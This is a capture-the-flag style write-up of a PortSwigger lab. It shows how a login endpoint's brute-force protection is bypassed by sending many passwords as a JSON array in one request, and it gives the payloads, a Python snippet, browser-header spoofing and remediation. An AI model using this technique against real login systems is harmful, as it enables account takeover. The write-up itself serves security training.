# Broken Brute-Force Protection: Multiple Credentials Per Request

**Platform:** PortSwigger Web Security Academy  
**Category:** Authentication  
**Difficulty:** Expert  
**Date Solved:** 2026-09-15  
**Severity:** High

## Summary

The login endpoint accepts JSON and processes an array of passwords in a single request. The application's brute-force protection counts requests — not attempts — meaning sending 100 passwords in one JSON array registers as a single login attempt. Protection completely bypassed. Full account takeover on `carlos` achieved with one HTTP request.


## Affected Component

`POST /login` — accepts `application/json`. No CSRF token. Fields: `username` (string), `password` (string — but also accepts array).

## Steps to Reproduce

### Phase 1 — Confirm JSON is accepted

Send a standard POST with `Content-Type: application/json`:
```json
{"username": "carlos", "password": "wrongpass"}
```
Server returns 200 with error page — JSON accepted.

### Phase 2 — Send password array in single request

Load full password wordlist into a Python list and send as JSON array:
```json
{"username": "carlos", "password": ["123456", "password", "letmein", "..."]}
```
Server loops through every password internally, tries each one, returns **302** on match.

### Phase 3 — Capture authenticated session

```python
r = requests.post(url, json={"username": "carlos", "password": passwords},
                  cookies={"session": FRESH_COOKIE}, headers=BROWSER_HEADERS,
                  allow_redirects=False)
new_cookie = r.cookies.get("session")
```
Inject `new_cookie` into browser → navigate to `/my-account?id=carlos` → lab solved ✅

## Proof of Concept

**Attack output:**
```
Status: 302
Location: /my-account?id=carlos
New cookie: CJicCnAteg2LJwphMVAkjT5wRv3gbxh7
```

<img width="1257" height="556" alt="image" src="https://github.com/user-attachments/assets/8ac9062b-4e02-4f09-a771-d58bc4dcb3fe" />
<img width="1912" height="941" alt="image" src="https://github.com/user-attachments/assets/22c6db94-201a-4fe1-bda8-46e74548810e" />

## Root Cause

The brute-force protection was implemented at the **request level** rather than the **attempt level**. The developer assumed one request = one password attempt. The login handler iterates over the password field if it receives an array — but the rate-limit counter never sees more than one increment regardless of array size.

```
Protection logic:  requestCount++ per POST → lock after N
Actual attempts:   server loops passwords[] → N attempts per POST
Gap:               protection and handler are decoupled
```

## Impact

### Technical
- Brute-force protection fully bypassed with a single request
- 100 password attempts registered as 1 by the rate limiter
- No lockout, no CAPTCHA triggered, no alert fired
- Full account takeover in under 1 second

### Business / Real-World
- An attacker can compromise any account with a known username silently
- Detection is near-impossible — 1 failed request in logs looks like a typo, not an attack
- In production: customer PII, payment data, admin access all at risk

### Severity Justification
Rated **High** (vs Medium for enumeration labs) because:
- No multi-step attack required — single request = access
- Protection is not just weak — it is completely non-functional
- Nearly undetectable in server logs

## Why Standard Approaches Failed First

| Approach | Problem |
|---|---|
| Python requests without headers | Server returned 403 |
| Session after logging in as wiener | Server returned 200 — already authenticated |
| Cookie without browser headers | Blocked by server-side checks |

**Fix:** Added `User-Agent`, `Referer`, and `Origin` headers to mimic a real browser — server accepted the payload.

## Remediation

1. **Count attempts, not requests** — rate-limit inside the password validation logic, not at HTTP request level
2. **Reject non-string password fields** — validate that `password` is a string; return 400 for arrays
3. **Strict JSON schema validation** on the login endpoint
4. **Account lockout** after N failed attempts regardless of delivery method
5. **Anomaly detection** — alert on any single request triggering multiple internal auth checks

## Lessons Learned

- Brute-force protection is only as good as what it counts — always probe whether it operates at request or attempt level
- JSON arrays are a universal probe — whenever a field accepts JSON, try sending it as an array
- Headers matter — a 403 from Python doesn't mean protected, it may just reject non-browser User-Agents
- Always use a fresh unauthenticated session cookie — a logged-in cookie skips the login handler entirely
- 1 request = full attack is the most dangerous brute-force pattern — silent and undetectable

---

## References

- [PortSwigger Lab](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)
- [PortSwigger — Brute-force attacks](https://portswigger.net/web-security/authentication/password-based)
- [OWASP — Testing for Weak Lock Out Mechanism](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)

---

**Tags:** `#PortSwigger` `#Authentication` `#BruteForce` `#JSONArrayBypass` `#RateLimitBypass` `#Expert` `#Python`
